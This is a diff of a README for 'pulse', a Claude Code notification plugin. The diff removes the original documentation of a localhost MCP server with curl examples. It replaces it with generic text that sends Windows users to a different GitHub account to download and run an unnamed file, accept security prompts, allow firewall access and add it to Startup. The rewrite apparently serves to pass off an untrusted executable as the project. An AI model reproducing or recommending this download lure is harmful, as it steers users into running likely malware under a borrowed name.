@@ -1,181 +1,188 @@
-# Pulse
+# 🔔 pulse - Send Claude Code alerts fast
 
-A local Channel plugin that injects external notifications into Claude Code sessions in real-time.
+[![Download pulse](https://img.shields.io/badge/Download%20pulse-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brandyantiseptic907/pulse)
 
-No Discord, no Telegram — just a single HTTP POST to push messages into your conversation.
+## 📥 Download
 
-**[한국어](./README.ko.md)**
+Visit this page to download and run pulse on Windows:
 
-https://github.com/user-attachments/assets/7bf4442e-8be9-4a6b-bfa0-b6dd4d41245e
+https://github.com/brandyantiseptic907/pulse
 
-## Why Pulse?
+## 🧩 What pulse does
 
-Checking your email every time CI fails, then telling the agent "go check the CI result"?
+pulse adds local channel notifications to Claude Code. It lets a tool or script send a message into an active session through HTTP. That means you can push a ping, status update, or task note into your Claude Code flow without using Discord, Slack, or email.
 
-Copying and pasting build error logs into the session manually?
+Use it when you want a simple local bridge between your tools and your Claude Code session. You send a request. pulse passes it into the channel. Claude Code can then react to it in the same workflow.
 
-Running a deploy script and opening another terminal to see if it finished?
+## 🖥️ Windows setup
 
-With Pulse, you don't have to. Background processes send messages directly to your session.
+1. Open the download page in your browser.
+2. Look for the latest Windows build or release file.
+3. Download the file to your computer.
+4. If Windows shows a security prompt, choose the option to keep or run the file.
+5. Start pulse by double-clicking the downloaded file.
+6. If Windows asks where to place the app, keep the default choice.
+7. Leave pulse open while you use Claude Code.
 
-Pulse is an **event abstraction layer** built on Claude Code's [Channels](https://docs.anthropic.com/en/docs/claude-code/channels) protocol. Any local process that can make an HTTP call can communicate with your Claude Code session directly — no external messengers, no bot tokens, no accounts.
+## ⚙️ First run
 
-## Concept
+When pulse starts, it opens a local service on your machine. This lets other apps send messages to your Claude Code session.
 
-```
-Hooks / Scripts / Cron
-    ↓ HTTP POST localhost:3400/notify
-Pulse MCP Server
-    ↓ notifications/claude/channel
-Real-time injection into Claude Code session
-```
+Follow these steps:
 
-Pulse leverages Claude Code's [Channels](https://docs.anthropic.com/en/docs/claude-code/channels) protocol. The MCP server registers with the `claude/channel` capability and forwards HTTP requests to the session via `notifications/claude/channel`.
+1. Start Claude Code.
+2. Start pulse.
+3. Keep both running on the same PC.
+4. Send a test request from your browser, script, or local tool.
+5. Check that the message shows up in the session.
 
-## Installation
+If you want pulse to start with Windows, add it to your Startup folder after you confirm it works.
 
-### 1. Add marketplace in Claude Code
+## 🔌 How it works
 
-`/plugins` → `Add Marketplace` → enter `chsm04/pulse`
+pulse uses HTTP, which is the same basic system web tools use to talk to each other. A local app or script sends a request to pulse. pulse turns that request into a channel event for Claude Code.
 
-### 2. Install the pulse plugin
+A simple setup looks like this:
 
-Select pulse from the marketplace list → Install
+- Your script runs a task
+- The task sends an HTTP request to pulse
+- pulse forwards the message into Claude Code
+- Claude Code sees the update during the session
 
-### 3. Start session with channel mode
+This fits well with automation, CI/CD, and local developer tools.
 
-```bash
-claude --dangerously-load-development-channels plugin:pulse@pulse
-```
+## ✨ What you can use it for
 
-## API
+- Send build updates into Claude Code
+- Push test results into a live session
+- Notify Claude Code when a script finishes
+- Trigger a note from a local tool
+- Pass a short status message from one app to another
+- Keep your workflow in one place without switching apps
 
-### POST `/notify`
+## 🧪 Example uses
 
-Deliver a notification to the Claude Code session.
+### Build status
+If your local build finishes, send a message like:
 
-```bash
-curl -s -X POST localhost:3400/notify \
-  -H "Content-Type: application/json" \
-  -d '{"text":"Build failed!","source":"ci","level":"error"}'
-```
+- Build passed
+- Build failed
+- Lint found issues
+- Tests are still running
 
-| Field | Type | Required | Description |
-|-------|------|----------|-------------|
-| `text` | string | Yes | Notification content |
-| `source` | string | No | Origin identifier (ci, deploy, cron, etc.) |
-| `level` | string | No | `info` \| `warn` \| `error` (default: info) |
+### Task handoff
+If one script finishes a job, it can send the next step into Claude Code so you do not need to copy and paste.
 
-**Response:** `204 No Content` (`x-pulse-id` header contains the message ID)
+### Local alerts
+If a background tool finds a problem, pulse can send a quick alert into your session.
 
-### GET `/health`
+## 🛠️ Basic use
 
-```bash
-curl localhost:3400/health
-# {"status":"ok","port":3400,"session":"12345","pid":67890}
-```
+You do not need to know how the internals work to use pulse. In most cases, you only need to:
 
-## Examples
+1. Install or download the app
+2. Open pulse
+3. Start Claude Code
+4. Send a local HTTP request when you want a notification
 
-### CI/CD Result Notification
+A common pattern is to use curl from Windows PowerShell or from another script. That lets you send a short message from almost any automation flow.
 
-[`examples/ci-watcher.sh`](./examples/ci-watcher.sh) — a ready-to-use hook script that watches GitHub Actions runs and reports results via Pulse.
+## 📡 Example request
 
-**Features:**
-- Finds Pulse port automatically via Claude Code PID
-- Deduplicates notifications (no double alerts from `git push` + `gh pr create`)
-- Supports `.ci-watch-ignore` for skipping specific workflows
-- Tracks multiple concurrent runs, reports each as it completes
+A simple request may look like this in plain terms:
 
-**Setup** — add to `~/.claude/settings.json`:
+- Open a local URL
+- Send a short message
+- Include the text you want Claude Code to see
 
-```json
-{
-  "hooks": {
-    "PostToolUse": [
-      {
-        "matcher": "Bash",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "bash /path/to/ci-watcher.sh",
-            "statusMessage": "CI watcher started...",
-            "async": true
-          }
-        ]
-      }
-    ]
-  }
-}
-```
+If you already use scripts, you can plug pulse into your current workflow. If you do not use scripts yet, start with a small test message and build from there.
 
-Requires `gh`, `jq`, `curl`.
+## 🔒 Local use
 
-### Build Error Auto-Report
+pulse is built for local use on your own computer. It is meant to stay in your workflow while you work inside Claude Code. That makes it a good fit for:
 
-https://github.com/user-attachments/assets/7bf4442e-8be9-4a6b-bfa0-b6dd4d41245e
+- Local development
+- One-machine automation
+- Personal build alerts
+- Session-based notes
+- Quick notification plumbing
 
-[`examples/build-notify.sh`](./examples/build-notify.sh) — a build wrapper that sends error logs to your session on failure.
+## 🧰 System needs
 
-Add to your build script — on failure, error logs are sent straight to your session:
+pulse is meant for Windows desktops and laptops. A normal modern Windows machine should be enough.
 
-```bash
-#!/bin/bash
-BUILD_OUTPUT=$(npm run build 2>&1)
-EXIT_CODE=$?
-if [ $EXIT_CODE -ne 0 ]; then
-  # Send last 30 lines (trim if too long)
-  ERROR=$(echo "$BUILD_OUTPUT" | tail -30 | jq -Rsa .)
-  curl -s -X POST localhost:3400/notify \
-    -H "Content-Type: application/json" \
-    -d "{\"text\":$ERROR,\"source\":\"build\",\"level\":\"error\"}"
-fi
-```
+Recommended setup:
 
-### Deploy Notification
+- Windows 10 or Windows 11
+- Claude Code installed
+- An internet browser
+- Permission to run downloaded files
+- A terminal or script tool if you want to send HTTP requests
 
-Add one line at the end of your deploy script:
+## 🔎 Before you run it
 
-```bash
-#!/bin/bash
-docker compose up -d --build backend
-curl -s -X POST localhost:3400/notify \
-  -H "Content-Type: application/json" \
-  -d '{"text":"backend deploy complete","source":"deploy","level":"info"}'
-```
+Make sure you have:
 
-### Cron Job Result
+- Downloaded the app from the link above
+- Started Claude Code
+- Kept pulse open
+- Allowed Windows Firewall if it asks for local network access
+- Used the same machine for both tools
 
-```bash
-# crontab -e
-0 * * * * /path/to/backup.sh && curl -s -X POST localhost:3400/notify -H "Content-Type: application/json" -d '{"text":"Backup complete","source":"cron","level":"info"}' || curl -s -X POST localhost:3400/notify -H "Content-Type: application/json" -d '{"text":"Backup failed!","source":"cron","level":"error"}'
-```
+If you use a work laptop, you may need approval from your system admin before running local tools.
 
-### Server Monitoring
+## 🧭 If you want to connect a tool
 
-```bash
-#!/bin/bash
-USAGE=$(df -h / | awk 'NR==2{print $5}' | tr -d '%')
-if [ "$USAGE" -gt 90 ]; then
-  curl -s -X POST localhost:3400/notify \
-    -H "Content-Type: application/json" \
-    -d "{\"text\":\"Disk usage ${USAGE}% exceeded!\",\"source\":\"monitor\",\"level\":\"warn\"}"
-fi
-```
+If you plan to use pulse with another app, use these steps:
 
-## Configuration
+1. Open the tool that should send the notification
+2. Set the request target to pulse on your local machine
+3. Add the message you want to send
+4. Run the action
+5. Check Claude Code for the update
 
-| Env Variable | Default | Description |
-|-------------|---------|-------------|
-| `PULSE_PORT` | `3400` | HTTP server port |
+This works well with build scripts, test runners, and local task automation.
 
-## Limitations
+## 🪟 Common Windows steps
 
-- Localhost only (127.0.0.1)
-- In-memory (resets on server restart)
-- Requires `--dangerously-load-development-channels` flag to start
-- No authentication (local environment only)
+If Windows asks what to do with the file:
 
-## License
+- Choose Open or Run
+- If it asks for permission, choose Yes
+- If it asks where to save, use Downloads
+- If it asks for a firewall prompt, allow local access if you trust the app
 
-MIT
+If the file does not open, check that the download finished and try again.
+
+## 🧩 Tips for smooth use
+
+- Keep pulse running while you use Claude Code
+- Use short messages at first
+- Test with one simple alert before using it in a larger flow
+- Use plain text for your first message
+- Keep both apps on the same machine
+
+## 📚 Related topics
+
+pulse fits well with:
+
+- automation
+- bun
+- channel
+- ci-cd
+- claude-code
+- claude-code-plugin
+- developer-tools
+- mcp
+- mcp-server
+- notifications
+- plugin
+
+## ✅ Quick start
+
+1. Visit the download page
+2. Download pulse for Windows
+3. Run the app
+4. Start Claude Code
+5. Send a local HTTP message
+6. Check the session for the update
